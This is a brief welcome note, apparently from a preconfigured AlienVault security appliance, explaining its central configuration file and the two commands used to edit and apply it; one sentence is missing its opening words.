Hi! Welcome to your new AlienVault system. Please, take a moment to read a few notes about some basic 
features of this preconfigured installation.
 
First of all, you must know that the AlientVault Installer aims at centralizing the configuration of
the common variables of the included applications into a single file (/etc/ossim/ossim_setup.conf), 
distinguishing between the profiles of the machines. The chosen profiles are the most commonly used on 
a typical AlienVault deployment.

In order to update this centralized configuration type the following command:

# alienvault-setup

configuration file you will need to execute a script that parses this file and reconfigures all the 
applications that depend on those common variables:

# alienvault-reconfig
